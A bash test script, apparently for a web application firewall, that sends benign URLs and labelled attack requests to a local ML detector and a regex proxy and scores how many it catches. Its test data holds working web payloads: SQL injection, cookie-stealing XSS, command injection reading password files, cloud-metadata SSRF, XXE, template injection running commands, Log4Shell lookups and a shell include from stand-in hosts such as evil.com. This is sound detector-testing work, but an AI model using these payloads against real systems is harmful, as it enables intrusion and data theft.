#!/bin/bash
# WebHydra Demo - Comprehensive Attack Test Suite
# Split into: Deep Learning Model tests and Proxy Signature tests
# Uses real payloads from PayloadsAllTheThings

# Usage: ./demo.sh [--ml | --proxy | --all]
#   --ml     : Test Deep Learning Model directly (port 9000)
#   --proxy  : Test Proxy Signature detection (port 8080)
#   --all    : Run both test suites (default)

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;36m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

ML_SERVICE_URL="http://127.0.0.1:9000"
PROXY_URL="http://127.0.0.1:8080"
ML_SCORE=0
ML_TOTAL=0
PROXY_SCORE=0
PROXY_TOTAL=0

# Parse arguments
MODE="all"
if [[ "$1" == "--ml" ]]; then
    MODE="ml"
elif [[ "$1" == "--proxy" ]]; then
    MODE="proxy"
fi

show_header() {
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}    WebHydra Attack Simulation Suite                            ${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
# DEEP LEARNING MODEL TESTS (Direct to ML Service port 9000)
# Tests the CharAutoencoder's ability to detect zero-day attacks
# ═══════════════════════════════════════════════════════════════════════════════

run_ml_test() {
    local name="$1"
    local expected="$2"  # "malicious" or "benign"
    local url="$3"
    local method="${4:-GET}"
    
    ((ML_TOTAL++))
    echo -ne "${YELLOW}  → $name... ${NC}"
    
    # Call ML service directly
    response=$(curl -s -X POST "$ML_SERVICE_URL/predict" \
        -H "Content-Type: application/json" \
        -d "{\"raw_request\": {\"url\": \"$url\", \"method\": \"$method\"}}" 2>/dev/null)
    
    score=$(echo "$response" | grep -oP '"score":\s*\K[0-9.]+' 2>/dev/null || echo "0")
    
    # Score > 0.5 = malicious, < 0.5 = benign
    is_malicious=$(echo "$score > 0.5" | bc -l 2>/dev/null || echo "0")
    
    if [ "$expected" == "malicious" ] && [ "$is_malicious" == "1" ]; then
        echo -e "${GREEN}[DETECTED - score: $score]${NC} ✓"
        ((ML_SCORE++))
    elif [ "$expected" == "benign" ] && [ "$is_malicious" == "0" ]; then
        echo -e "${GREEN}[BENIGN - score: $score]${NC} ✓"
        ((ML_SCORE++))
    elif [ "$expected" == "malicious" ]; then
        echo -e "${RED}[MISSED - score: $score]${NC}"
    else
        echo -e "${RED}[FALSE POSITIVE - score: $score]${NC}"
    fi
}

run_ml_tests() {
    echo -e "\n${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║     DEEP LEARNING MODEL TESTS (CharAutoencoder)               ║${NC}"
    echo -e "${CYAN}║     Direct tests against ML Service (port 9000)               ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
    
    # Check if ML service is running
    echo -ne "\n${YELLOW}Checking ML Service... ${NC}"
    ml_health=$(curl -s "$ML_SERVICE_URL/health" 2>/dev/null)
    if [[ "$ml_health" == *"healthy"* ]]; then
        echo -e "${GREEN}RUNNING${NC}"
    else
        echo -e "${RED}NOT RUNNING - Start with: cd ml_service && python app.py${NC}"
        return
    fi
    
    # ━━━ Benign URLs (should NOT be detected) ━━━
    echo -e "\n${PURPLE}━━━ Benign URLs (False Positive Check - 20 Safe Requests) ━━━${NC}"
    run_ml_test "Google Search" "benign" "https://google.com/search?q=weather+today"
    run_ml_test "Amazon Product" "benign" "https://amazon.com/dp/B08N5WRWNW"
    run_ml_test "GitHub Repo" "benign" "https://github.com/user/repo/blob/main/README.md"
    run_ml_test "Wikipedia Article" "benign" "https://en.wikipedia.org/wiki/Machine_learning"
    run_ml_test "YouTube Video" "benign" "https://youtube.com/watch?v=dQw4w9WgXcQ"
    run_ml_test "LinkedIn Profile" "benign" "https://linkedin.com/in/john-doe-123456"
    run_ml_test "Twitter Post" "benign" "https://twitter.com/user/status/1234567890"
    run_ml_test "Reddit Thread" "benign" "https://reddit.com/r/programming/comments/abc123/hello"
    run_ml_test "Stack Overflow" "benign" "https://stackoverflow.com/questions/12345678/how-to-python"
    run_ml_test "Medium Article" "benign" "https://medium.com/@author/great-article-on-security-abc123"
    run_ml_test "News Site" "benign" "https://bbc.com/news/technology-12345678"
    run_ml_test "E-commerce Cart" "benign" "https://shop.example.com/cart?item=shirt&size=M&color=blue"
    run_ml_test "File Download" "benign" "https://cdn.example.com/downloads/document.pdf"
    run_ml_test "API Call Normal" "benign" "https://api.example.com/v1/users/123/profile"
    run_ml_test "Image Gallery" "benign" "https://photos.example.com/gallery/vacation-2024?page=2"
    run_ml_test "Event Calendar" "benign" "https://calendar.example.com/events?date=2024-12-25&type=holiday"
    run_ml_test "Job Search" "benign" "https://jobs.example.com/search?keywords=engineer&location=remote"
    run_ml_test "Blog Post" "benign" "https://blog.example.com/2024/01/15/introduction-to-cybersecurity"
    run_ml_test "Product Review" "benign" "https://reviews.example.com/product/laptop-model-x?rating=5&sort=recent"
    run_ml_test "Contact Form" "benign" "https://example.com/contact?name=John&email=john@email.com&subject=inquiry"
    
    # ━━━ SQL Injection ━━━
    echo -e "\n${PURPLE}━━━ SQL Injection ━━━${NC}"
    run_ml_test "SQLi - Basic OR" "malicious" "http://example.com/login?user=admin' OR '1'='1"
    run_ml_test "SQLi - UNION SELECT" "malicious" "http://example.com/search?id=1 UNION SELECT username,password FROM users--"
    run_ml_test "SQLi - Stacked Query" "malicious" "http://example.com/page?id=1; DROP TABLE users;--"
    run_ml_test "SQLi - Time Blind" "malicious" "http://example.com/user?id=1 AND SLEEP(5)--"
    
    # ━━━ Cross-Site Scripting (XSS) ━━━
    echo -e "\n${PURPLE}━━━ Cross-Site Scripting (XSS) ━━━${NC}"
    run_ml_test "XSS - Script Tag" "malicious" "http://example.com/search?q=<script>alert('XSS')</script>"
    run_ml_test "XSS - Event Handler" "malicious" "http://example.com/page?name=<img src=x onerror=alert(1)>"
    run_ml_test "XSS - SVG Onload" "malicious" "http://example.com/display?data=<svg/onload=alert(1)>"
    run_ml_test "XSS - JavaScript URI" "malicious" "http://example.com/redirect?url=javascript:alert(document.cookie)"
    
    # ━━━ Command Injection ━━━
    echo -e "\n${PURPLE}━━━ Command Injection ━━━${NC}"
    run_ml_test "CMDi - Pipe" "malicious" "http://example.com/ping?host=127.0.0.1|cat /etc/passwd"
    run_ml_test "CMDi - Semicolon" "malicious" "http://example.com/lookup?domain=test.com;whoami"
    run_ml_test "CMDi - Backtick" "malicious" 'http://example.com/check?file=`id`'
    run_ml_test "CMDi - \$()" "malicious" 'http://example.com/exec?cmd=$(cat /etc/shadow)'
    
    # ━━━ Path Traversal / LFI ━━━
    echo -e "\n${PURPLE}━━━ Path Traversal / LFI ━━━${NC}"
    run_ml_test "Traversal - Unix" "malicious" "http://example.com/view?file=../../../etc/passwd"
    run_ml_test "Traversal - Windows" "malicious" "http://example.com/download?path=..\\..\\..\\windows\\system32\\config\\sam"
    run_ml_test "Traversal - Encoded" "malicious" "http://example.com/read?doc=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    run_ml_test "Traversal - Double Encoded" "malicious" "http://example.com/file?name=%252e%252e%252fetc%252fpasswd"
    
    # ━━━ SSRF ━━━
    echo -e "\n${PURPLE}━━━ Server-Side Request Forgery (SSRF) ━━━${NC}"
    run_ml_test "SSRF - AWS Metadata" "malicious" "http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
    run_ml_test "SSRF - Localhost" "malicious" "http://example.com/proxy?target=http://127.0.0.1:22"
    run_ml_test "SSRF - Internal" "malicious" "http://example.com/load?resource=http://192.168.1.1/admin"
    
    # ━━━ XXE ━━━
    echo -e "\n${PURPLE}━━━ XML External Entity (XXE) ━━━${NC}"
    run_ml_test "XXE - File Read" "malicious" "http://example.com/parse?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
    run_ml_test "XXE - SSRF via DTD" "malicious" "http://example.com/import?data=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/xxe.dtd'>%xxe;]>"
    
    # ━━━ SSTI ━━━
    echo -e "\n${PURPLE}━━━ Server-Side Template Injection (SSTI) ━━━${NC}"
    run_ml_test "SSTI - Jinja2" "malicious" "http://example.com/render?template={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
    run_ml_test "SSTI - Twig" "malicious" "http://example.com/page?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
    
    # ━━━ LDAP Injection ━━━
    echo -e "\n${PURPLE}━━━ LDAP Injection ━━━${NC}"
    run_ml_test "LDAP - Wildcard" "malicious" "http://example.com/user?name=*)(&"
    run_ml_test "LDAP - Null Byte" "malicious" "http://example.com/search?filter=admin)%00"
    
    # ━━━ Log4Shell ━━━
    echo -e "\n${PURPLE}━━━ Log4Shell / JNDI ━━━${NC}"
    run_ml_test "Log4Shell - Basic" "malicious" 'http://example.com/api?x=${jndi:ldap://evil.com/a}'
    run_ml_test "Log4Shell - Obfuscated" "malicious" 'http://example.com/log?msg=${${lower:j}ndi:${lower:l}dap://attacker.com/x}'
    
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
# PROXY SIGNATURE TESTS (Through WAF Proxy port 8080)
# Tests the regex-based signature detection in the proxy
# ═══════════════════════════════════════════════════════════════════════════════

run_proxy_test() {
    local name="$1"
    local expected="$2"
    local method="$3"
    local url="$4"
    local data="$5"
    local content_type="$6"

    ((PROXY_TOTAL++))
    echo -ne "${YELLOW}  → $name... ${NC}"

    if [ "$method" == "POST" ]; then
        if [ -n "$content_type" ]; then
            response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
                -H "Content-Type: $content_type" \
                --data-binary "$data" 2>/dev/null)
        else
            response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" -d "$data" 2>/dev/null)
        fi
    else
        response=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    fi

    # Determine if blocked (403 or 400)
    is_blocked=false
    if [ "$response" == "403" ] || [ "$response" == "400" ]; then
        is_blocked=true
    fi

    # Check if result matches expectation
    if [ "$expected" == "blocked" ] && [ "$is_blocked" == "true" ]; then
        echo -e "${GREEN}[BLOCKED]${NC} ✓"
        ((PROXY_SCORE++))
    elif [ "$expected" == "allowed" ] && [ "$is_blocked" == "false" ]; then
        echo -e "${GREEN}[ALLOWED]${NC} ✓"
        ((PROXY_SCORE++))
    elif [ "$expected" == "blocked" ]; then
        echo -e "${RED}[MISSED - HTTP $response]${NC}"
    else
        echo -e "${RED}[FALSE POSITIVE - HTTP $response]${NC}"
    fi
}

run_proxy_tests() {
    echo -e "\n${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║     PROXY SIGNATURE TESTS (Regex-based Detection)             ║${NC}"
    echo -e "${CYAN}║     Tests through WAF Proxy (port 8080)                        ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
    
    # Check if Proxy is running
    echo -ne "\n${YELLOW}Checking WAF Proxy... ${NC}"
    proxy_health=$(curl -s "$PROXY_URL/health" 2>/dev/null)
    if [[ "$proxy_health" == *"ok"* ]]; then
        echo -e "${GREEN}RUNNING${NC}"
    else
        echo -e "${RED}NOT RUNNING - Start with: cd proxy && python app.py${NC}"
        return
    fi

    # ━━━ SQL Injection ━━━
    echo -e "\n${PURPLE}━━━ SQL Injection ━━━${NC}"
    run_proxy_test "SQLi - Auth Bypass" "blocked" "POST" \
        "$PROXY_URL/rest/user/login" \
        '{"email":"admin'\'' or '\''1'\''='\''1","password":"x"}' \
        "application/json"
        
    run_proxy_test "SQLi - Sleep (PATT)" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q=ORDER%20BY%20SLEEP(5)"

    # ━━━ NoSQL Injection ━━━
    echo -e "\n${PURPLE}━━━ NoSQL Injection ━━━${NC}"
    run_proxy_test "NoSQLi - \$where" "blocked" "POST" \
        "$PROXY_URL/rest/user/login" \
        '{"email":{"$where":"1 == 1"},"password":"x"}' \
        "application/json"

    # ━━━ Cross-Site Scripting (XSS) ━━━
    echo -e "\n${PURPLE}━━━ Cross-Site Scripting (XSS) ━━━${NC}"
    run_proxy_test "XSS - PATT Payload" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q=javascript:alert(1)//INJECTX"

    run_proxy_test "XSS - Script Tag" "blocked" "POST" \
        "$PROXY_URL/api/Feedbacks" \
        '{"comment":"<script>alert(1)</script>","rating":5}' \
        "application/json"

    # ━━━ Command Injection ━━━
    echo -e "\n${PURPLE}━━━ Command Injection ━━━${NC}"
    run_proxy_test "CMDi - cat /etc/passwd" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q=%0Acat%20/etc/passwd"

    # ━━━ SSRF ━━━
    echo -e "\n${PURPLE}━━━ SSRF ━━━${NC}"
    run_proxy_test "SSRF - Metadata (PATT)" "blocked" "GET" \
        "$PROXY_URL/redirect?to=metadata.google.internal"

    run_proxy_test "SSRF - AWS" "blocked" "GET" \
        "$PROXY_URL/redirect?to=http://169.254.169.254/"

    # ━━━ XXE Injection ━━━
    echo -e "\n${PURPLE}━━━ XXE Injection ━━━${NC}"
    run_proxy_test "XXE - Basic Entity" "blocked" "POST" \
        "$PROXY_URL/file-upload" \
        '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>' \
        "application/xml"

    # ━━━ SSTI ━━━
    echo -e "\n${PURPLE}━━━ SSTI ━━━${NC}"
    run_proxy_test "SSTI - Handlebars/Mustache" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q={{7*7}}"

    # ━━━ Directory Traversal ━━━
    echo -e "\n${PURPLE}━━━ Directory Traversal ━━━${NC}"
    run_proxy_test "Traversal - Windows win.ini" "blocked" "GET" \
        "$PROXY_URL/public/images/..\\..\\WINDOWS\\win.ini"

    # ━━━ LFI ━━━
    echo -e "\n${PURPLE}━━━ LFI ━━━${NC}"
    run_proxy_test "LFI - etc/passwd" "blocked" "GET" \
        "$PROXY_URL/assets/public?file=etc/passwd"

    # ━━━ RFI ━━━
    echo -e "\n${PURPLE}━━━ RFI ━━━${NC}"
    run_proxy_test "RFI - Remote URL" "blocked" "GET" \
        "$PROXY_URL/assets/public?file=http://evil.com/shell.php"

    # ━━━ Upload Insecure Files ━━━
    echo -e "\n${PURPLE}━━━ Upload Insecure Files ━━━${NC}"
    run_proxy_test "Upload - PHP Shell" "blocked" "POST" \
        "$PROXY_URL/profile/image/file.php" \
        "<?php system('id'); ?>" \
        "application/x-php"

    # ━━━ HTTP Parameter Pollution ━━━
    echo -e "\n${PURPLE}━━━ HTTP Parameter Pollution ━━━${NC}"
    run_proxy_test "HPP - Duplicate Parameter" "blocked" "GET" \
        "$PROXY_URL/rest/products/search?q=apple&q=banana"

    # ━━━ Open Redirect ━━━
    echo -e "\n${PURPLE}━━━ Open Redirect ━━━${NC}"
    run_proxy_test "Open Redirect - PATT" "blocked" "GET" \
        "$PROXY_URL/redirect?to=//google.com/%2f.."

    # ━━━ CRLF Injection ━━━
    echo -e "\n${PURPLE}━━━ CRLF Injection ━━━${NC}"
    run_proxy_test "CRLF - Cookie Injection" "blocked" "GET" \
        "$PROXY_URL/v1/user/login?email=%0aSet-Cookie:crlf=injection"

    # ━━━ LDAP Injection ━━━
    echo -e "\n${PURPLE}━━━ LDAP Injection ━━━${NC}"
    run_proxy_test "LDAP - Star Wildcard" "blocked" "POST" \
        "$PROXY_URL/login" \
        'user=*)(&' \
        "application/x-www-form-urlencoded"

    # ━━━ XPath Injection ━━━
    echo -e "\n${PURPLE}━━━ XPath Injection ━━━${NC}"
    run_proxy_test "XPath - ' or '1'='1" "blocked" "POST" \
        "$PROXY_URL/login" \
        "user=' or '1'='1" \
        "application/xml"

    # ━━━ Format String Attack ━━━
    echo -e "\n${PURPLE}━━━ Format String Attack ━━━${NC}"
    run_proxy_test "Format String - %s%s%s" "blocked" "GET" \
        "$PROXY_URL/profile?name=%s%s%s"

    # ━━━ SSI Injection ━━━
    echo -e "\n${PURPLE}━━━ SSI Injection ━━━${NC}"
    run_proxy_test "SSI - Exec" "blocked" "GET" \
        "$PROXY_URL/index.html?q=<!--#echo var=\"DATE_LOCAL\" -->"

    # ━━━ Buffer Overflow ━━━
    echo -e "\n${PURPLE}━━━ Buffer Overflow ━━━${NC}"
    OVERFLOW=$(python3 -c "print('A'*150)")
    run_proxy_test "Buffer Overflow - 150 As" "blocked" "POST" \
        "$PROXY_URL/api/Feedbacks" \
        "{\"comment\":\"$OVERFLOW\",\"rating\":1}" \
        "application/json"
        
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

show_header

case "$MODE" in
    "ml")
        echo -e "${BLUE}Running: Deep Learning Model Tests Only${NC}"
        run_ml_tests
        echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
        PERCENTAGE=$((ML_SCORE * 100 / ML_TOTAL))
        if [ $ML_SCORE -eq $ML_TOTAL ]; then
            echo -e "ML Model Score: ${GREEN}${ML_SCORE}/${ML_TOTAL}${NC} ($PERCENTAGE%) - ${GREEN}EXCELLENT${NC}"
        elif [ $PERCENTAGE -ge 70 ]; then
            echo -e "ML Model Score: ${YELLOW}${ML_SCORE}/${ML_TOTAL}${NC} ($PERCENTAGE%) - ${YELLOW}GOOD${NC}"
        else
            echo -e "ML Model Score: ${RED}${ML_SCORE}/${ML_TOTAL}${NC} ($PERCENTAGE%) - ${RED}NEEDS IMPROVEMENT${NC}"
        fi
        echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
        ;;
    "proxy")
        echo -e "${BLUE}Running: Proxy Signature Tests Only${NC}"
        run_proxy_tests
        echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
        PERCENTAGE=$((PROXY_SCORE * 100 / PROXY_TOTAL))
        if [ $PROXY_SCORE -eq $PROXY_TOTAL ]; then
            echo -e "Proxy Score: ${GREEN}${PROXY_SCORE}/${PROXY_TOTAL}${NC} ($PERCENTAGE%) - ${GREEN}EXCELLENT${NC}"
        elif [ $PERCENTAGE -ge 70 ]; then
            echo -e "Proxy Score: ${YELLOW}${PROXY_SCORE}/${PROXY_TOTAL}${NC} ($PERCENTAGE%) - ${YELLOW}GOOD${NC}"
        else
            echo -e "Proxy Score: ${RED}${PROXY_SCORE}/${PROXY_TOTAL}${NC} ($PERCENTAGE%) - ${RED}NEEDS IMPROVEMENT${NC}"
        fi
        echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
        ;;
    *)
        echo -e "${BLUE}Running: Complete Test Suite (ML + Proxy)${NC}"
        run_ml_tests
        run_proxy_tests
        
        TOTAL_SCORE=$((ML_SCORE + PROXY_SCORE))
        TOTAL_TESTS=$((ML_TOTAL + PROXY_TOTAL))
        
        echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}                      FINAL RESULTS                             ${NC}"
        echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
        
        if [ $ML_TOTAL -gt 0 ]; then
            ML_PERC=$((ML_SCORE * 100 / ML_TOTAL))
            echo -e "  Deep Learning Model: ${ML_SCORE}/${ML_TOTAL} ($ML_PERC%)"
        fi
        
        if [ $PROXY_TOTAL -gt 0 ]; then
            PROXY_PERC=$((PROXY_SCORE * 100 / PROXY_TOTAL))
            echo -e "  Proxy Signatures:    ${PROXY_SCORE}/${PROXY_TOTAL} ($PROXY_PERC%)"
        fi
        
        echo -e "${BLUE}────────────────────────────────────────────────────────────────${NC}"
        
        PERCENTAGE=$((TOTAL_SCORE * 100 / TOTAL_TESTS))
        if [ $TOTAL_SCORE -eq $TOTAL_TESTS ]; then
            echo -e "  OVERALL: ${GREEN}${TOTAL_SCORE}/${TOTAL_TESTS}${NC} ($PERCENTAGE%) - ${GREEN}EXCELLENT${NC}"
        elif [ $PERCENTAGE -ge 70 ]; then
            echo -e "  OVERALL: ${YELLOW}${TOTAL_SCORE}/${TOTAL_TESTS}${NC} ($PERCENTAGE%) - ${YELLOW}GOOD${NC}"
        else
            echo -e "  OVERALL: ${RED}${TOTAL_SCORE}/${TOTAL_TESTS}${NC} ($PERCENTAGE%) - ${RED}NEEDS IMPROVEMENT${NC}"
        fi
        echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
        ;;
esac
